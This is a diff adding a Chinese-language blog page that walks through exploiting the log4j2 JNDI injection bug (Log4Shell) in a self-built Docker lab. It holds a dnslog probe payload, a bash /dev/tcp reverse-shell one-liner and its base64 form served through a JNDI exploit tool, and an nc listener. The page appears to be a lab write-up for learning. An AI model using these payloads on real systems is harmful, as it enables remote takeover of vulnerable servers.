@@ -1,0 +1,254 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>漏洞报告-log4j2 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="log4j2环境：靶机，攻击机均在vps centos7上
+1.靶场搭建靶场下载地址
+https://github.com/Ode1esse/springboot-login-log4j2-dock,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="漏洞报告-log4j2 - Hexo"/>
+    <meta name="twitter:description" content="log4j2环境：靶机，攻击机均在vps centos7上
+1.靶场搭建靶场下载地址
+https://github.com/Ode1esse/springboot-login-log4j2-dock,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="Hexo"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="漏洞报告-log4j2 - Hexo"/>
+    <meta property="og:description" content="log4j2环境：靶机，攻击机均在vps centos7上
+1.靶场搭建靶场下载地址
+https://github.com/Ode1esse/springboot-login-log4j2-dock,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">漏洞报告-log4j2</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">漏洞报告-log4j2</h1>
+        <div class="stuff">
+            <span>三月 11, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h1><p>环境：靶机，攻击机均在vps centos7上</p>
+<h2 id="1-靶场搭建"><a href="#1-靶场搭建" class="headerlink" title="1.靶场搭建"></a>1.靶场搭建</h2><p>靶场下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Ode1esse/springboot-login-log4j2-docker">https://github.com/Ode1esse/springboot-login-log4j2-docker</a></p>
+<p>code-http-复制链接</p>
+<p><img src="https://s2.loli.net/2022/01/06/CaluNExcti3H49L.png" alt="20220106132748"></p>
+<p>复制到链接<a target="_blank" rel="noopener" href="https://github.com/Ode1esse/springboot-login-log4j2-docker.git">https://github.com/Ode1esse/springboot-login-log4j2-docker.git</a></p>
+<p>服务器命令行用git下载</p>
+<pre><code>git clone https://github.com/Ode1esse/springboot-login-log4j2-docker.git
+</code></pre>
+<p>成功下载</p>
+<p><img src="https://s2.loli.net/2022/01/06/oOpjRqsNX1BgTS5.png" alt="20220106133855"></p>
+<p>进入该目录</p>
+<pre><code>cd springboot-login-log4j2-docker
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/06/1xXIWbTKcVwvg4k.png" alt="20220106134027"></p>
+<p>记得如果docker没开启的话要先开启，不然会出现error:couldn&#96;t connect to docker……的报错</p>
+<pre><code>systemctl start docker
+</code></pre>
+<p>启动springboot-login-log4j2-docker容器</p>
+<pre><code>docker-compose up -d
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/06/o6Wqvm2Ysgi5z4P.png" alt="20220106134549"></p>
+<p>查看下端口占用情况</p>
+<pre><code>netstat -antl
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/06/DeS3TZNRG4rOVLg.png" alt="PU88HF}DWO9T9CI0CBCX$E6"></p>
+<p>可以看到9090和3306端口是占用了的，试一下是哪一个</p>
+<h1 id="疑问-除了用这个方法试出来是哪个端口，还可以怎么办呢"><a href="#疑问-除了用这个方法试出来是哪个端口，还可以怎么办呢" class="headerlink" title="疑问 除了用这个方法试出来是哪个端口，还可以怎么办呢"></a>疑问 除了用这个方法试出来是哪个端口，还可以怎么办呢</h1><p>在浏览器用45.63.50.70：9090打开了靶场</p>
+<p><img src="https://s2.loli.net/2022/01/06/2kTS5wMuV6yFO7r.png" alt="20220106135200"></p>
+<h2 id="2-验证漏洞是否存在"><a href="#2-验证漏洞是否存在" class="headerlink" title="2.验证漏洞是否存在"></a>2.验证漏洞是否存在</h2><p>直接跳转至登录界面</p>
+<p>因为登录页面大概率会记录登录错误信息，所以这里输入的错误信息会被日志记录，payload会被执行</p>
+<p>先用dnslog验证漏洞存在</p>
+<p>打开dnslog网页，<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>
+<p>点击Get SubDomain 得到域名 我的是lhfv5x.dnslog.cn</p>
+<p><img src="https://s2.loli.net/2022/01/06/7juk28nHpwM1Bmz.png" alt="20220106135545"></p>
+<p>将域名构造进payload填入登录框</p>
+<p>${jndi:ldap:&#x2F;&#x2F;lhfv5x.dnslog.cn&#x2F;exp}</p>
+<p>密码随便填，例如111</p>
+<p>点击登录</p>
+<p><img src="https://s2.loli.net/2022/01/06/Ah93N8iP7IUCyVz.png" alt="20220106143434"></p>
+<p>点击Refresh Record刷新</p>
+<p><img src="https://s2.loli.net/2022/01/06/eWvR3EPq4j5mz1c.png" alt="20220106143452"></p>
+<p>得到回显，证明漏洞存在</p>
+<h2 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h2><p>反弹shell命令是bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</p>
+<p>ip是靶机的ip。port设置一个端口号，该端口后面用于nc监听</p>
+<p>则该命令为bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;45.63.50.70&#x2F;1232 0&gt;&amp;1</p>
+<p>将这条命令经base64编码</p>
+<p>编码地址<a target="_blank" rel="noopener" href="https://www.jackson-t.ca/runtime-exec-payloads.html">https://www.jackson-t.ca/runtime-exec-payloads.html</a></p>
+<p><img src="https://s2.loli.net/2022/01/06/XMeobxYBySCmWQg.png" alt="20220106144643"></p>
+<p>得到编码后内容bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42My41MC43MC8xMjMyIDA+JjE&#x3D;}|{base64,-d}|{bash,-i}</p>
+<p>该部分代码用于打开JNDI服务</p>
+<p>在攻击机打开JNDI服务</p>
+<pre><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80NS42My41MC43MC8xMjMyIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;45.63.50.70&quot;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/06/5z3cljr6tNx2PWU.png" alt="20220106145022"></p>
+<p>在JDNI返回的代码中选择适合自己JDK版本的，我的是1.7就1.7下面随便选一个</p>
+<p>ldap:&#x2F;&#x2F;45.63.50.70:1389&#x2F;rkadt2</p>
+<p>构造进payload里面${jndi:ldap&#x2F;&#x2F;45.63.50.70:1389&#x2F;rkadt2}</p>
+<p>新开一个终端，打开nc监听，监听端口就用JNDI编码进去的那个端口</p>
+<pre><code>nc -lvvp 1232
+</code></pre>
+<p>在浏览器登录框输入上面payload，密码随便例如111</p>
+<pre><code>$&#123;jndi:ldap//45.63.50.70:1389/rkadt2&#125;
+</code></pre>
+<p><img src="https://s2.loli.net/2022/01/06/m3TVovAFSkUKstO.png" alt="20220106150956"></p>
+<p>nc拿到反弹shell</p>
+<p><img src="https://s2.loli.net/2022/01/06/sPmclLBTvORS4kV.png" alt="20220106151054"></p>
+<p>用ls查看目录</p>
+<pre><code>cd /logs/log4j2
+
+cat error.log
+</code></pre>
+<p>可以查看到刚才的用户登录信息</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                        
+                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link"
+		data-enable="false"
+        data-ae="false"
+        data-ci=""
+        data-cs=""
+        data-r=""
+        data-o=""
+        data-a=""
+        data-d="false"
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
